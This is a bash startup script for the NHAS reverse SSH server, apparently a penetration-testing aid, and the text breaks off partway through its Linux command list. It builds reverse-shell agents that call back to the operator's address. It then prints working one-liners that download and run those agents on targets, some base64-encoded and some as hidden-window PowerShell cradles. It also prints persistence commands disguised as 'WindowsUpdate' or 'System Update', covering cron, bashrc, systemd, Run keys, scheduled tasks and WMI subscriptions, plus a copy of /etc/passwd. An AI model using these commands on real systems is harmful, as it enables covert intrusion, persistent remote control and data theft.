#!/bin/bash
#
# NHAS Reverse SSH Server Startup Script
#

NHAS_DIR="${NHAS_DIR:-/home/alien/Desktop/Tools/OSCP-nhas-ssh-server}"
DATA_DIR="$NHAS_DIR/bin"
EXPLOIT_DIR="$NHAS_DIR/bin/exploits"
SERVER_BIN="$DATA_DIR/server"
CLIENT_PUBKEY="$NHAS_DIR/internal/client/keys/private_key.pub"
AUTH_KEYS="$DATA_DIR/authorized_controllee_keys"
TOOLS_SCRIPT="$NHAS_DIR/nhas-tools.sh"   # thin wrapper — replace tools.py freely without touching this script
DEFAULT_PORT="3232"
DEFAULT_HTTP_PORT="80"

# Colors — $'...' so plain echo works without -e
RED=$'\033[0;31m'
GREEN=$'\033[0;32m'
YELLOW=$'\033[1;33m'
CYAN=$'\033[0;36m'
GRAY=$'\033[0;90m'
LGRAY=$'\033[0;37m'
DIM=$'\033[2;37m'
NC=$'\033[0m'
BOLD=$'\033[1m'

ETH_IP=$(ip route get 1 2>/dev/null | awk '{print $7; exit}')
[[ -z "$ETH_IP" ]] && ETH_IP=$(hostname -I | awk '{print $1}')

if [[ -f "$CLIENT_PUBKEY" ]]; then
    CLIENT_KEY=$(cat "$CLIENT_PUBKEY")
    if ! grep -qF "$CLIENT_KEY" "$AUTH_KEYS" 2>/dev/null; then
        echo "$CLIENT_KEY" >> "$AUTH_KEYS"
        echo "${GREEN}[+]${NC} Client key authorized"
    fi
fi

echo ""
echo "${CYAN}"
cat << 'EOF'
    _   ____  _____   _____ 
   / | / / / / /   | / ___/
  /  |/ / /_/ / /| | \__ \ 
 / /|  / __  / ___ |___/ / 
/_/ |_/_/ /_/_/  |_/____/  
   Reverse SSH Server
EOF
echo "${NC}"

echo "${BOLD}=============================================="
echo "  NHAS SETUP"
echo "==============================================${NC}"
echo ""

echo "${BOLD}=============================================="
echo "  QUICK SUMMARY - AVAILABLE AGENTS"
echo "==============================================${NC}"
echo ""
echo "  ${CYAN}Two agent types:${NC}"
echo "  ${GRAY}  Direct     : callback compiled in, runs without arguments                 <- easiest${NC}"
echo "  ${GRAY}  Non-direct : requires -d IP:PORT argument, more flexible                  <- most common${NC}"
echo ""
echo "  ${CYAN}Target checks:${NC}"
echo "  ${LGRAY}Linux   : uname -s ; uname -m${NC}"
echo "  ${LGRAY}Windows : echo %PROCESSOR_ARCHITECTURE%${NC}"
echo ""

if [[ -d "$EXPLOIT_DIR" ]]; then
    echo "  ${CYAN}Available Linux agents:${NC}"
    for bin in $(ls "$EXPLOIT_DIR"/nhasLinuxAmd64Direct* "$EXPLOIT_DIR"/nhasLinux386Direct* "$EXPLOIT_DIR"/nhasLinuxArm*Direct* 2>/dev/null); do
        [[ -f "$bin" ]] || continue
        NAME=$(basename "$bin"); SIZE=$(du -h "$bin" 2>/dev/null | cut -f1)
        [[ "$NAME" == *"Compressed"* ]] \
            && echo "  ${GREEN}[+]${NC} ${YELLOW}${NAME}${NC}  ${GRAY}[${SIZE}] direct, compressed${NC}" \
            || echo "  ${GREEN}[+]${NC} ${YELLOW}${NAME}${NC}  ${GRAY}[${SIZE}] direct${NC}"
    done
    for bin in $(ls "$EXPLOIT_DIR"/nhasLinuxAmd64 "$EXPLOIT_DIR"/nhasLinuxAmd64Compressed "$EXPLOIT_DIR"/nhasLinux386 "$EXPLOIT_DIR"/nhasLinuxArm64 "$EXPLOIT_DIR"/nhasLinuxArmv6 "$EXPLOIT_DIR"/nhasLinuxArmv7 2>/dev/null); do
        [[ -f "$bin" ]] || continue
        NAME=$(basename "$bin"); SIZE=$(du -h "$bin" 2>/dev/null | cut -f1)
        if   [[ "$NAME" == *"Compressed"* ]];  then echo "  ${GREEN}[+]${NC} ${YELLOW}${NAME}${NC}  ${GRAY}[${SIZE}] non-direct, compressed  <- smallest${NC}"
        elif [[ "$NAME" == "nhasLinuxAmd64" ]]; then echo "  ${GREEN}[+]${NC} ${YELLOW}${NAME}${NC}  ${GRAY}[${SIZE}] non-direct               <- most common${NC}"
        else echo "  ${GREEN}[+]${NC} ${YELLOW}${NAME}${NC}  ${GRAY}[${SIZE}] non-direct${NC}"; fi
    done
    echo ""
    echo "  ${CYAN}Available Windows agents:${NC}"
    for bin in $(ls "$EXPLOIT_DIR"/nhasWin*irect*.exe 2>/dev/null); do
        [[ -f "$bin" ]] || continue
        NAME=$(basename "$bin"); SIZE=$(du -h "$bin" 2>/dev/null | cut -f1)
        [[ "$NAME" == *"Compressed"* ]] \
            && echo "  ${GREEN}[+]${NC} ${YELLOW}${NAME}${NC}  ${GRAY}[${SIZE}] direct, compressed${NC}" \
            || echo "  ${GREEN}[+]${NC} ${YELLOW}${NAME}${NC}  ${GRAY}[${SIZE}] direct${NC}"
    done
    for bin in $(ls "$EXPLOIT_DIR"/nhasWin*.exe 2>/dev/null); do
        [[ -f "$bin" ]] || continue
        NAME=$(basename "$bin"); [[ "$NAME" == *"irect"* ]] && continue
        SIZE=$(du -h "$bin" 2>/dev/null | cut -f1)
        if   [[ "$NAME" == *"Compressed"* ]];    then echo "  ${GREEN}[+]${NC} ${YELLOW}${NAME}${NC}  ${GRAY}[${SIZE}] non-direct, compressed${NC}"
        elif [[ "$NAME" == "nhasWinAmd64.exe" ]]; then echo "  ${GREEN}[+]${NC} ${YELLOW}${NAME}${NC}  ${GRAY}[${SIZE}] non-direct               <- most common${NC}"
        else echo "  ${GREEN}[+]${NC} ${YELLOW}${NAME}${NC}  ${GRAY}[${SIZE}] non-direct${NC}"; fi
    done
else
    echo "  ${RED}[!]${NC} Exploit dir not found: $EXPLOIT_DIR"
    echo "  ${YELLOW}    Run: ${NHAS_DIR}/nhas-build.sh${NC}"
fi
echo ""

# -------------------------------------------------------------------------
# PROMPTS
# -------------------------------------------------------------------------
read -p "Interface or IP [tun0]: " INPUT_IFACE
if [[ "${INPUT_IFACE:-tun0}" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    TUN0_IP="${INPUT_IFACE}"; IFACE="(manual IP)"
else
    IFACE="${INPUT_IFACE:-tun0}"
    TUN0_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    [[ -z "$TUN0_IP" ]] && echo "${RED}[!] Interface '$IFACE' not found.${NC}" && exit 1
fi

read -p "NHAS callback port [${DEFAULT_PORT}]: " INPUT_PORT;     PORT="${INPUT_PORT:-$DEFAULT_PORT}"
read -p "HTTP download port [${DEFAULT_HTTP_PORT}]: " INPUT_HTTP; HTTP_PORT="${INPUT_HTTP:-$DEFAULT_HTTP_PORT}"
read -p "Linux agent  [nhasLinuxAmd64]: " INPUT_LA;               LINUX_AGENT="${INPUT_LA:-nhasLinuxAmd64}"
read -p "Windows agent [nhasWinAmd64.exe]: " INPUT_WA;            WIN_AGENT="${INPUT_WA:-nhasWinAmd64.exe}"

[[ "$LINUX_AGENT" == *"Direct"* ]] && LINUX_CONNECT="" || LINUX_CONNECT=" -d ${TUN0_IP}:${PORT}"
[[ "$WIN_AGENT"   == *"irect"*  ]] && WIN_CONNECT=""   || WIN_CONNECT=" -d ${TUN0_IP}:${PORT}"

# Windows path helpers -- defined early so persistence section can use them
_BS='\'
WIN_TEMP="C:${_BS}Windows${_BS}Temp${_BS}${WIN_AGENT}"
WIN_CWD=".${_BS}${WIN_AGENT}"
WIN_UNC="${_BS}${_BS}${TUN0_IP}${_BS}evil${_BS}${WIN_AGENT}"
WIN_TEMP_EXEC="${WIN_TEMP}${WIN_CONNECT}" 

echo ""
echo "${BOLD}=============================================="
echo "  CONFIGURATION"
echo "==============================================${NC}"
echo ""
echo "  ${GREEN}[+]${NC} Listen:        ${YELLOW}0.0.0.0:${DEFAULT_PORT}${NC}"
echo "  ${GREEN}[+]${NC} Callback:      ${YELLOW}${TUN0_IP}:${PORT}${NC}"
echo "  ${GREEN}[+]${NC} HTTP DL:       ${YELLOW}${TUN0_IP}:${HTTP_PORT}${NC}"
echo "  ${GREEN}[+]${NC} Interface:     ${YELLOW}${IFACE}${NC}  (${TUN0_IP})"
echo "  ${GREEN}[+]${NC} eth0:          ${YELLOW}${ETH_IP}${NC}"
echo "  ${GREEN}[+]${NC} Linux Agent:   ${YELLOW}${LINUX_AGENT}${NC}  $([ -z "$LINUX_CONNECT" ] && echo "${GRAY}(direct)${NC}" || echo "${GRAY}(non-direct)${NC}")"
echo "  ${GREEN}[+]${NC} Windows Agent: ${YELLOW}${WIN_AGENT}${NC}  $([ -z "$WIN_CONNECT" ] && echo "${GRAY}(direct)${NC}" || echo "${GRAY}(non-direct)${NC}")"
echo "  ${GREEN}[+]${NC} Data dir:      ${YELLOW}${DATA_DIR}${NC}"
echo "  ${GREEN}[+]${NC} Exploits:      ${YELLOW}${EXPLOIT_DIR}${NC}"
echo ""

SOCAT_PID=""
if [[ "$PORT" != "$DEFAULT_PORT" ]]; then
    echo "${BOLD}=============================================="
    echo "  PORT FORWARD"
    echo "==============================================${NC}"
    echo "  ${CYAN}[*]${NC} Callback port ${PORT} ≠ listen port ${DEFAULT_PORT} — starting socat in background"
    if command -v socat &>/dev/null; then
        socat TCP-LISTEN:${PORT},fork,reuseaddr TCP:localhost:${DEFAULT_PORT} &
        SOCAT_PID=$!
        sleep 0.3
        if kill -0 "$SOCAT_PID" 2>/dev/null; then
            echo "  ${GREEN}[+]${NC} socat running (PID ${SOCAT_PID})  ${GRAY}:${PORT} → localhost:${DEFAULT_PORT}${NC}"
            echo "  ${GRAY}    Kill: pkill -f "socat.*${PORT}"  or  kill ${SOCAT_PID}${NC}"
        else
            echo "  ${RED}[!]${NC} socat failed — port ${PORT} may already be in use"
            printf "  ${YELLOW}    Manual: sudo socat TCP-LISTEN:${PORT},fork,reuseaddr TCP:localhost:${DEFAULT_PORT}${NC}\n"
            SOCAT_PID=""
        fi
    else
        echo "  ${RED}[!]${NC} socat not found — install it or forward manually:"
        printf "  ${YELLOW}    sudo socat TCP-LISTEN:${PORT},fork,reuseaddr TCP:localhost:${DEFAULT_PORT}${NC}\n"
    fi
    echo ""
fi

echo "${BOLD}=============================================="
echo "  QUICK BUILD - DIRECT AGENTS  [ ${TUN0_IP}:${PORT} ]"
echo "==============================================${NC}"
echo ""
echo "  ${GRAY}Builds agents with YOUR IP:PORT baked in via -ldflags. Run from terminal:${NC}"
echo ""
echo "  ${LGRAY}cd ${NHAS_DIR}${NC}"
printf "  ${YELLOW}%s${NC}\n" "GOOS=linux   GOARCH=amd64 go build -trimpath -ldflags=\"-s -w -X 'main.destination=${TUN0_IP}:${PORT}'\" -o /tmp/nhasLinuxAmd64Direct   ./cmd/client"
printf "  ${YELLOW}%s${NC}\n" "GOOS=windows GOARCH=amd64 go build -trimpath -ldflags=\"-s -w -X 'main.destination=${TUN0_IP}:${PORT}'\" -o /tmp/nhasWinAmd64Direct.exe ./cmd/client"
echo ""

echo "${BOLD}=============================================="
echo "  BUILD AGENTS"
echo "==============================================${NC}"
echo ""
echo "  ${CYAN}# Build all binaries (run once before first use)${NC}"
echo "  ${YELLOW}${NHAS_DIR}/nhas-build.sh${NC}"
echo ""
echo "  ${CYAN}# From catcher console -- connect first, then build:${NC}"
echo "  ${YELLOW}ssh rssh${NC}"
printf "  ${LGRAY}%s${NC}    ${GRAY}# direct${NC}\n"    "link --homeserver ${TUN0_IP}:${PORT} --goos linux   --goarch amd64 --name nhasLinuxAmd64Direct"
printf "  ${LGRAY}%s${NC}  ${GRAY}# direct${NC}\n"      "link --homeserver ${TUN0_IP}:${PORT} --goos windows --goarch amd64 --name nhasWinAmd64Direct.exe"
echo "  ${LGRAY}link --goos linux   --goarch amd64 --name nhasLinuxAmd64${NC}            ${GRAY}# non-direct${NC}"
echo "  ${LGRAY}link --goos windows --goarch amd64 --name nhasWinAmd64.exe${NC}          ${GRAY}# non-direct${NC}"
echo ""

echo "${BOLD}=============================================="
echo "  SSH CONSOLE"
echo "==============================================${NC}"
echo ""
echo "  ${YELLOW}ssh rssh${NC}  ${GRAY}# connects to the NHAS catcher${NC}"
echo ""

echo "${BOLD}=============================================="
echo "  CONNECT TO TARGETS (from catcher console)"
echo "==============================================${NC}"
echo ""
echo "  ${CYAN}# General${NC}"
echo "  ${YELLOW}catcher\$ ls -t${NC}                                    ${GRAY}# list connected clients (newest first)${NC}"
echo "  ${YELLOW}ssh -J rssh <id>${NC}                                  ${GRAY}# connect (Linux)${NC}"
echo "  ${YELLOW}ssh -tt -J rssh <id>${NC}                              ${GRAY}# connect Windows  <- always use -tt${NC}"
echo "  ${YELLOW}ssh -L 8080:127.0.0.1:80 -J rssh <id>${NC}             ${GRAY}# local port forward${NC}"
echo "  ${YELLOW}ssh -D 9050 -J rssh <id>${NC}                          ${GRAY}# SOCKS5 proxy${NC}"
echo "  ${YELLOW}scp -J rssh <id>:/etc/passwd .${NC}                    ${GRAY}# file copy${NC}"
echo ""
echo "  ${CYAN}# Windows shell unstable / must press Enter repeatedly? (ConPTY buffer bug)${NC}"
echo "  ${YELLOW}  \$b=\$host.UI.RawUI.BufferSize;\$b.Width=220;\$b.Height=9999;\$host.UI.RawUI.BufferSize=\$b;\$w=\$host.UI.RawUI.WindowSize;\$w.Width=220;\$w.Height=50;\$host.UI.RawUI.WindowSize=\$w${NC}  ${GRAY}# PS${NC}"
echo "  ${YELLOW}  mode con cols=220 lines=50${NC}                        ${GRAY}# cmd.exe (no PS needed)${NC}"
echo ""
echo "  ${CYAN}# Windows: PS restricted or ConPTY broken -> drop to cmd.exe${NC}"
echo "  ${LGRAY}  cmd.exe /c powershell -ep bypass${NC}                  ${GRAY}# bypass constrained language mode${NC}"
echo "  ${LGRAY}  %COMSPEC%${NC}                                          ${GRAY}# plain cmd.exe shell${NC}"
echo ""

# ---- Persistence helpers ----
_LBIN="/tmp/${LINUX_AGENT}"                  # assumed drop path (cmd #5/#6 above)
_LSVC="${LINUX_AGENT%%.*}"                   # service/cron name (no extension)
# Registry /d value: bare path for direct agents, quoted path+args for non-direct
if [[ -z "$WIN_CONNECT" ]]; then
    _WIN_REG_VAL="${WIN_TEMP}"
else
    _WIN_REG_VAL="\"${WIN_TEMP}${WIN_CONNECT}\""
fi

echo "${BOLD}=============================================="
echo "  PERSISTENCE  [ Linux: ${_LBIN}  |  Windows: ${WIN_TEMP} ]"
echo "==============================================${NC}"
echo "  ${GRAY}Assumes agent already dropped. Linux: use cmd #5/#6. Windows: use cmd #1/#2.${NC}"
echo ""

echo "  ${BOLD}${CYAN}--- LINUX ---${NC}"
echo ""

echo "  ${CYAN}# 1. crontab - every minute${NC}"
printf "  ${YELLOW}%s${NC}\n" "(crontab -l 2>/dev/null;echo \"* * * * * ${_LBIN}${LINUX_CONNECT} >/dev/null 2>&1\")|crontab -"
echo ""

echo "  ${CYAN}# 2. crontab - re-download if missing (survives deletion)${NC}"
printf "  ${GRAY}%s${NC}\n" "(crontab -l 2>/dev/null;echo \"* * * * * test -x ${_LBIN}||curl -so ${_LBIN} http://${TUN0_IP}:${HTTP_PORT}/${LINUX_AGENT}&&chmod +x ${_LBIN};${_LBIN}${LINUX_CONNECT} >/dev/null 2>&1\")|crontab -"
echo ""

echo "  ${CYAN}# 3. bashrc (interactive login shells)${NC}"
printf "  ${YELLOW}%s${NC}\n" "echo 'nohup ${_LBIN}${LINUX_CONNECT} >/dev/null 2>&1 &' >> ~/.bashrc"
echo ""

echo "  ${CYAN}# 4. .profile (login shells, sh-compatible, wider coverage)${NC}"
printf "  ${LGRAY}%s${NC}\n" "echo 'nohup ${_LBIN}${LINUX_CONNECT} >/dev/null 2>&1 &' >> ~/.profile"
echo ""

echo "  ${CYAN}# 5. systemd user service (auto-restart, survives reboot)${NC}"
printf "  ${YELLOW}%s${NC}\n" "mkdir -p ~/.config/systemd/user;printf '[Unit]\nDescription=System Update\n[Service]\nExecStart=${_LBIN}${LINUX_CONNECT}\nRestart=always\nRestartSec=10\n[Install]\nWantedBy=default.target' > ~/.config/systemd/user/${_LSVC}.service;systemctl --user enable --now ${_LSVC}"
echo ""

echo "  ${CYAN}# 6. /etc/cron.d (root only, survives reboot)${NC}"
printf "  ${DIM}%s${NC}\n" "echo '* * * * * root ${_LBIN}${LINUX_CONNECT} >/dev/null 2>&1' > /etc/cron.d/${_LSVC}"
echo ""

echo "  ${BOLD}${CYAN}--- WINDOWS ---${NC}"
echo ""

echo "  ${CYAN}# 1. Registry Run - HKCU (user, no admin needed)${NC}"
printf "  ${YELLOW}%s${NC}\n" "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d ${_WIN_REG_VAL} /f"
echo ""

echo "  ${CYAN}# 2. Registry Run - HKLM (admin, all users)${NC}"
printf "  ${LGRAY}%s${NC}\n" "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d ${_WIN_REG_VAL} /f"
echo ""

echo "  ${CYAN}# 3. Scheduled Task - on logon${NC}"
printf "  ${GRAY}%s${NC}\n" "schtasks /create /tn WindowsUpdate /tr \"${WIN_TEMP_EXEC}\" /sc onlogon /ru %USERNAME% /f"
echo ""

echo "  ${CYAN}# 4. Scheduled Task - every 5 min${NC}"
printf "  ${GRAY}%s${NC}\n" "schtasks /create /tn WindowsUpdate /tr \"${WIN_TEMP_EXEC}\" /sc minute /mo 5 /ru %USERNAME% /f"
echo ""

echo "  ${CYAN}# 5. Startup folder (user, no admin, runs on login)${NC}"
printf "  ${LGRAY}%s${NC}\n" "copy ${WIN_TEMP} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe\""
echo ""

echo "  ${CYAN}# 6. WMI event subscription (admin, triggers ~4 min after boot)${NC}"
printf "  ${DIM}%s${NC}\n" "powershell -ep bypass -c \"\$a=Set-WmiInstance Win32_EventFilter -Namespace root/subscription -Arguments @{Name='upd';EventNamespace='root/cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime>=240 AND TargetInstance.SystemUpTime<300'};\$b=Set-WmiInstance Win32_CommandLineEventConsumer -Namespace root/subscription -Arguments @{Name='upd';CommandLineTemplate='${WIN_TEMP_EXEC}'};\$null=Set-WmiInstance __FilterToConsumerBinding -Namespace root/subscription -Arguments @{Filter=\$a;Consumer=\$b}\""
echo ""

echo "${BOLD}=============================================="
echo "  STARTING SERVER..."
echo "==============================================${NC}"
echo ""

[[ ! -f "$SERVER_BIN" ]] && echo "${RED}[!] Server binary not found: $SERVER_BIN${NC}" && exit 1
mkdir -p "$EXPLOIT_DIR"
pgrep -f "server.*--datadir" > /dev/null && echo "${YELLOW}[!] Server may already be running (pkill -f 'server.*--datadir')${NC}" && echo ""

echo "${BOLD}=============================================="
echo "  AUTO-BUILD - TEMP DIRECT AGENTS  [ ${TUN0_IP}:${PORT} ]"
echo "==============================================${NC}"
echo ""

TEMP_DIR=$(mktemp -d /tmp/nhas-session-XXXXXX)
_LINUX_BAK=""; _WIN_BAK=""
[[ -f "${EXPLOIT_DIR}/nhasLinuxAmd64Direct" ]]   && _LINUX_BAK="${TEMP_DIR}/nhasLinuxAmd64Direct.bak"   && cp "${EXPLOIT_DIR}/nhasLinuxAmd64Direct"   "$_LINUX_BAK"
[[ -f "${EXPLOIT_DIR}/nhasWinAmd64Direct.exe" ]] && _WIN_BAK="${TEMP_DIR}/nhasWinAmd64Direct.exe.bak" && cp "${EXPLOIT_DIR}/nhasWinAmd64Direct.exe" "$_WIN_BAK"

_nhas_cleanup() {
    echo ''
    # Stop socat port forward if we started it
    if [[ -n "${SOCAT_PID:-}" ]] && kill -0 "$SOCAT_PID" 2>/dev/null; then
        kill "$SOCAT_PID" 2>/dev/null
        wait "$SOCAT_PID" 2>/dev/null
    fi
    # Stop the file server (tools.py / DualServe) if we started it
    if [[ -n "${TOOLS_PID:-}" ]] && kill -0 "$TOOLS_PID" 2>/dev/null; then
        pkill -P "$TOOLS_PID" 2>/dev/null
        kill "$TOOLS_PID" 2>/dev/null
        wait "$TOOLS_PID" 2>/dev/null
    fi
    echo "${GREEN}[+]${NC} Restoring agents..."
    if [[ -n "$_LINUX_BAK" && -f "$_LINUX_BAK" ]]; then mv "$_LINUX_BAK" "${EXPLOIT_DIR}/nhasLinuxAmd64Direct" 2>/dev/null
    else rm -f "${EXPLOIT_DIR}/nhasLinuxAmd64Direct"; fi
    if [[ -n "$_WIN_BAK" && -f "$_WIN_BAK" ]]; then mv "$_WIN_BAK" "${EXPLOIT_DIR}/nhasWinAmd64Direct.exe" 2>/dev/null
    else rm -f "${EXPLOIT_DIR}/nhasWinAmd64Direct.exe"; fi
    rm -rf "${TEMP_DIR}"
    echo "${GREEN}[+]${NC} Done."
}
trap _nhas_cleanup EXIT INT TERM

_GO=""
for _gpath in "$(command -v go 2>/dev/null)" "/usr/local/go/bin/go" "$HOME/go/bin/go" "/usr/bin/go"; do
    [[ -x "$_gpath" ]] && _GO="$_gpath" && break
done
[[ -f "$NHAS_DIR/go.mod" ]] && _BUILD_DIR="$NHAS_DIR" || { [[ -f "$(pwd)/go.mod" ]] && _BUILD_DIR="$(pwd)" || _BUILD_DIR=""; }
_LINUX_DIRECT_BUILT=false; _WIN_DIRECT_BUILT=false

if [[ -n "$_BUILD_DIR" && -n "$_GO" ]]; then
    cd "$_BUILD_DIR" || true
    echo "  ${GRAY}Using: $_GO  |  Source: $_BUILD_DIR${NC}"
    echo "  ${GRAY}Output: ${EXPLOIT_DIR}  (served directly by NHAS)${NC}"
    echo ""
    _BUILD_ERR=$(mktemp)

    printf "  %-52s" "nhasLinuxAmd64Direct  (linux/amd64)"
    if GOOS=linux GOARCH=amd64 CGO_ENABLED=0 "$_GO" build -trimpath \
        -ldflags="-s -w -X 'main.destination=${TUN0_IP}:${PORT}'" \
        -o "${EXPLOIT_DIR}/nhasLinuxAmd64Direct" ./cmd/client 2>"$_BUILD_ERR"; then
        echo "${GREEN}done  <- ${TUN0_IP}:${PORT} baked in${NC}"; _LINUX_DIRECT_BUILT=true
    else
        echo "${RED}failed${NC}"; head -3 "$_BUILD_ERR" | sed 's/^/    /'
        echo "  ${YELLOW}Fallback: ssh rssh -> link --homeserver ${TUN0_IP}:${PORT} --goos linux --goarch amd64 --name nhasLinuxAmd64Direct${NC}"
    fi

    printf "  %-52s" "nhasWinAmd64Direct.exe  (windows/amd64)"
    if GOOS=windows GOARCH=amd64 CGO_ENABLED=0 "$_GO" build -trimpath \
        -ldflags="-s -w -X 'main.destination=${TUN0_IP}:${PORT}'" \
        -o "${EXPLOIT_DIR}/nhasWinAmd64Direct.exe" ./cmd/client 2>"$_BUILD_ERR"; then
        echo "${GREEN}done  <- ${TUN0_IP}:${PORT} baked in${NC}"; _WIN_DIRECT_BUILT=true
    else
        echo "${RED}failed${NC}"; head -3 "$_BUILD_ERR" | sed 's/^/    /'
        echo "  ${YELLOW}Fallback: ssh rssh -> link --homeserver ${TUN0_IP}:${PORT} --goos windows --goarch amd64 --name nhasWinAmd64Direct.exe${NC}"
    fi

    rm -f "$_BUILD_ERR"
    echo ""
    echo "  ${GREEN}[+]${NC} Agents written to ${YELLOW}${EXPLOIT_DIR}${NC}  ${GRAY}<- restored on exit${NC}"
elif [[ -z "$_GO" ]]; then
    echo "  ${RED}[!] go not found in PATH${NC}"
else
    echo "  ${YELLOW}[!] NHAS source not found at ${NHAS_DIR}${NC}"
fi

cd "$DATA_DIR" || exit 1
echo ""

# =========================================================================
# PRE-COMPUTE ALL BASE64 VARIANTS
#
# Windows path building: use _BS='\' (literal backslash from single quotes)
# then concatenate — avoids ALL bash backslash escaping ambiguity.
# Display: use printf '%s\n' for Windows paths so \n \e are NEVER interpreted.
# =========================================================================

# ---- Linux base64 ----
L_SHM_CMD="f=/dev/shm/.\$\$;curl -so \$f http://${TUN0_IP}:${HTTP_PORT}/${LINUX_AGENT}&&chmod +x \$f&&\$f${LINUX_CONNECT};rm -f \$f"
L_SHM_B64=$(printf '%s' "$L_SHM_CMD" | base64 -w0)

L_TMP_WGET_CMD="f=/tmp/.\$\$;wget -qO \$f http://${TUN0_IP}:${HTTP_PORT}/${LINUX_AGENT}&&chmod +x \$f&&\$f${LINUX_CONNECT};rm -f \$f"
L_TMP_WGET_B64=$(printf '%s' "$L_TMP_WGET_CMD" | base64 -w0)

L_WGET_CWD_CMD="wget http://${TUN0_IP}:${HTTP_PORT}/${LINUX_AGENT} -O ./${LINUX_AGENT}&&chmod +x ./${LINUX_AGENT}&&./${LINUX_AGENT}${LINUX_CONNECT}"
L_WGET_CWD_B64=$(printf '%s' "$L_WGET_CWD_CMD" | base64 -w0)

L_CURL_CWD_CMD="curl -so ./${LINUX_AGENT} http://${TUN0_IP}:${HTTP_PORT}/${LINUX_AGENT}&&chmod +x ./${LINUX_AGENT}&&./${LINUX_AGENT}${LINUX_CONNECT}"
L_CURL_CWD_B64=$(printf '%s' "$L_CURL_CWD_CMD" | base64 -w0)

# (Windows path vars defined earlier, after user prompts)

# ---- Windows PS command strings ----
# \$x = PS variable $x (bash \$ -> literal $)
PS_IWR_CWD="iwr -Uri 'http://${TUN0_IP}:${HTTP_PORT}/${WIN_AGENT}' -OutFile ${WIN_CWD}; ${WIN_CWD}${WIN_CONNECT}"
PS_IWR_CWD_B64=$(printf '%s' "$PS_IWR_CWD" | iconv -t UTF-16LE 2>/dev/null | base64 -w0)

PS_IWR_TEMP="iwr -Uri 'http://${TUN0_IP}:${HTTP_PORT}/${WIN_AGENT}' -OutFile '${WIN_TEMP}'; ${WIN_TEMP_EXEC}"
PS_IWR_TEMP_B64=$(printf '%s' "$PS_IWR_TEMP" | iconv -t UTF-16LE 2>/dev/null | base64 -w0)

# Random filename (Get-Random is a PS subexpression - must use \$ to protect from bash)
_WIN_RAND_PATH="C:${_BS}Windows${_BS}Temp${_BS}\$(Get-Random).exe"
PS_IWR_RND="\$p=\"${_WIN_RAND_PATH}\";iwr http://${TUN0_IP}:${HTTP_PORT}/${WIN_AGENT} -O \$p;\$p${WIN_CONNECT}"
PS_IWR_RND_B64=$(printf '%s' "$PS_IWR_RND" | iconv -t UTF-16LE 2>/dev/null | base64 -w0)

PS_HID="\$p=\"${_WIN_RAND_PATH}\";iwr http://${TUN0_IP}:${HTTP_PORT}/${WIN_AGENT} -O \$p;$([ -z "$WIN_CONNECT" ] && echo "Start-Process \$p -WindowStyle Hidden" || echo "Start-Process \$p -ArgumentList '-d','${TUN0_IP}:${PORT}' -WindowStyle Hidden");sleep 1;rm \$p"
PS_HID_B64=$(printf '%s' "$PS_HID" | iconv -t UTF-16LE 2>/dev/null | base64 -w0)

PS_PERM="\$p='${WIN_TEMP}';iwr http://${TUN0_IP}:${HTTP_PORT}/${WIN_AGENT} -O \$p;\$p${WIN_CONNECT}"
PS_PERM_B64=$(printf '%s' "$PS_PERM" | iconv -t UTF-16LE 2>/dev/null | base64 -w0)

PS_WEBCLIENT="(New-Object Net.WebClient).DownloadFile('http://${TUN0_IP}:${HTTP_PORT}/${WIN_AGENT}','${WIN_TEMP}'); ${WIN_TEMP_EXEC}"
PS_WEBCLIENT_B64=$(printf '%s' "$PS_WEBCLIENT" | iconv -t UTF-16LE 2>/dev/null | base64 -w0)

PS_SMB="copy ${WIN_UNC} ${WIN_TEMP} -Force; ${WIN_TEMP_EXEC}"
PS_SMB_B64=$(printf '%s' "$PS_SMB" | iconv -t UTF-16LE 2>/dev/null | base64 -w0)

# =========================================================================
# LINUX AGENT COMMANDS
# =========================================================================
echo "${BOLD}=============================================="
echo "  LINUX AGENT COMMANDS  [ ${LINUX_AGENT} ]$([ -z "$LINUX_CONNECT" ] && echo "  ${GRAY}direct - no args needed${NC}" || echo "  ${GRAY}non-direct - embeds -d ${TUN0_IP}:${PORT}${NC}")"
echo "==============================================${NC}"
echo ""

if [[ "$_LINUX_DIRECT_BUILT" == "true" ]]; then
    echo "  ${GREEN}[+] TEMP DIRECT AGENT (auto-built, no -d needed, served by NHAS):${NC}"
    echo "  ${YELLOW}f=/dev/shm/.\$\$;curl -so \$f http://${TUN0_IP}:${HTTP_PORT}/nhasLinuxAmd64Direct&&chmod +x \$f&&\$f;rm -f \$f${NC}"
    echo "  ${YELLOW}f=/tmp/.\$\$;wget -qO \$f http://${TUN0_IP}:${HTTP_PORT}/nhasLinuxAmd64Direct&&chmod +x \$f&&\$f;rm -f \$f${NC}"
    echo ""
fi

echo "  ${CYAN}# 1. curl -> /dev/shm (fileless, standard)${NC}"
echo "  ${YELLOW}f=/dev/shm/.\$\$;curl -so \$f http://${TUN0_IP}:${HTTP_PORT}/${LINUX_AGENT}&&chmod +x \$f&&\$f${LINUX_CONNECT};rm -f \$f${NC}"
echo ""
echo "  ${CYAN}# 2. curl -> /dev/shm (base64 one-liner)${NC}"
echo "  ${GRAY}\$(echo ${L_SHM_B64}|base64 -d|sh)${NC}"
echo ""
echo "  ${CYAN}# 3. wget -> /tmp (fileless, standard)${NC}"
echo "  ${LGRAY}f=/tmp/.\$\$;wget -qO \$f http://${TUN0_IP}:${HTTP_PORT}/${LINUX_AGENT}&&chmod +x \$f&&\$f${LINUX_CONNECT};rm -f \$f${NC}"
echo ""
echo "  ${CYAN}# 4. wget -> /tmp (base64 one-liner)${NC}"
echo "  ${GRAY}\$(echo ${L_TMP_WGET_B64}|base64 -d|sh)${NC}"
echo ""
echo "  ${CYAN}# 5. wget -> /tmp/${LINUX_AGENT} (persistent copy)${NC}"
